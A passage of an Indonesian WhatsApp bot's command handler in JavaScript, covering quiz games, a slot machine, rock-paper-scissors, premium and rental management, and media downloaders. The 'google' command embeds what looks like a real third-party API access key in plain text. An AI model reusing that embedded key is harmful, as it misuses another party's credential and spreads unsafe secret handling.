              gameAdd(sender, glimit)
              break
       case 'siapaaku':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi') 
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Hisnu.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
})
              await sleep(30000)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaksiapaaku[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
}
              gameAdd(sender, glimit)
              break
       case 'tebakkata':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/kata?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              Hisnu.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
})
              await sleep(30000)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakata[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklirik':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Hisnu.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
      case 'tebakjenaka':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Hisnu.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
})
              await sleep(30000)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakjenaka[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
}
              gameAdd(sender, glimit)
              break
       case 'kimiakuis':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.lambang
              pertanyaan = get_result.nama
              Hisnu.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
})
              await sleep(30000)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakimia[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
}
              gameAdd(sender, glimit)
              break
       case 'tebakbendera':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.flag
              Hisnu.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
})
              await sleep(30000)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakbendera[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
}
              gameAdd(sender, glimit)
              break
       case 'susunkata':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/susunkata?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              Hisnu.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
})
              await sleep(30000)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete susunkata[sender.split('@')[0]]
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
}
              gameAdd(sender, glimit)
              break
       case 'asahotak':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/asahotak?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              Hisnu.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
})
              await sleep(30000)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete asahotak[sender.split('@')[0]]
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
}
              gameAdd(sender, glimit)
              break
       case 'caklontong':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=${setting.lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Hisnu.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
})
              await sleep(30000)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete caklontong[sender.split('@')[0]]
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
}
              gameAdd(sender, glimit)
              break
       case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
              break
       case 'suit': //nyolong dari zenz
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
//------------------< Sewa >-------------------
       case 'sewa':
              if (!isGroup)return reply(mess.only.group)
              if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
              if (args[0].toLowerCase() === 'add'){
            _sewa.addSewaGroup(from, args[1], sewa)
              reply(`Success`)
              } else if (args[0].toLowerCase() === 'del'){
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
              reply(mess.success)
              } else {
              reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
              break
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
}
              reply(txtnyee)
              break
       case 'sewacheck':
       case 'ceksewa': 
              if (!isGroup) return reply(mess.only.group)
              if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
              let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
              let premiumnya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
              reply(premiumnya)
              break
//------------------< Premium >-------------------
       case 'premium': 
              if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
              if (args[0] === 'add') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

              premium.addPremiumUser(mentioned[0], args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                        
              } else {
                            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
              } else if (args[0] === 'del') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
}
              } else {
              reply(mess.wrongFormat)
}
              break
       case 'premiumcheck':
       case 'cekpremium': 
              if (!isPremium) return reply(mess.only.premium)
              const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
              reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
              break
       case 'listprem':
       case 'listpremium':          
              let txt = `「 *PREMIUM USER LIST* 」\n\n`
              let men = [];
              for (let i of _premium){
              men.push(i.id)
              const checkExp = ms(i.expired - Date.now())
              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
}
              mentions(txt, men, true)
              break
      case 'belipremium':
      case 'buypremium':
      case 'sewabot':
       menu =`SEWA BOT LAGI CLOSE :D`

               buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: '𝐎𝐖𝐍𝐄𝐑'},type:1}]

               imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/sewa.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/sewa.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
               Hisnu.relayWAMessage(prep)
               break
//------------------< Sticker Cmd >-------------------
       case 'addcmd': 
       case 'setcmd':
              if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
              if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('tag stickenya')
}
              break
       case 'delcmd':
              if(!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
              if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
//------------------< Downloader/Search/Anime >-------------------
       case 'igdl':
       case 'instagram':
              try {
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isUrl(q)) return reply('Linknya?')
              reply(mess.wait)
              res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${setting.lolkey}&url=${args[0]}`)
              data = res.data.result
              for (let i = 0; i < data.media.length; i++) {
              sendMediaURL(from, data.media[i], data.caption, {thumbnail: Buffer.alloc(0)})
}
              } catch (e) {
              console.log(e)
              reply(String(e))
}
              break 
       case 'igdl2':
       case 'instagram2':
              try {
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply('Linknya?')
              reply(mess.wait)
              res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=${setting.zekskey}&url=${args[0]}`)
              for(let i = 0; i < res.data.result.length; i++) {
              sendMediaURL(from, res.data.result[i].url, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${res.data.owner}\`\`\`
\`\`\`▢ Caption : ${res.data.caption}\`\`\``, {thumbnail: Buffer.alloc(0)})
}
              } catch (e) {
              console.log(e)
              reply(String(e))
}
              break
       case 'igdl3': 
       case 'instagram3':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('instagram')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await igDownloader(`${q}`)
             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, mek) })
             .catch((err) => { reply(String(err)) })
              break
       case 'scplay': 
       case 'soundcloud':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('soundcloud')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${setting.lolkey}&url=${q}`)
             .then((data) => { sendMediaURL(from, data.result, mek) })
             .catch((err) => { reply(String(err)) })
              break
       case 'image':
       case 'gimage':
       case 'googleimage':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
              reply(mess.wait)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break
      case 'ytmp3':
            if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
})
            break
     case 'ytmp4':
            if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateV(teks).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
})
            break
     case 'ytmp4hd':
     case 'ythd':
            if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
            if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return reply(mess.error.Iv)
            try {
            reply(mess.wait)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas* : 720p\`\`\`
\`\`\`▢ Size* : ${filesizeF}\`\`\`
\`\`\`▢ Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas : 720p\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))
})		
})
              } catch (err) {
              reply(`eror`)
}
              break
        case 'google':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply(mess.wrongFormat)
              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f3fce33fa6804c0b97c897b3bd2ec7a8&url=https://google.com/search?q=${q}`)
              reply(mess.wait)
              if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              googleIt({ 'query': q }).then(results => {
              vars = `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
               Hisnu.sendMessage(from, ss, image, {caption: vars, quoted : mek})
               }).catch(e => {
               console.log(e)
               reply(`${e}`)
})
               break
        case 'mediafire':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (args.length < 1) return reply('Link Nya Mana? ')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
               reply(mess.wait)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Nama : ${res[0].nama}\`\`\`
\`\`\`▢ Ukuran : ${res[0].size}\`\`\`
\`\`\`▢ Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             reply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             break
       case 'tiktok': 
       case 'ttdl':
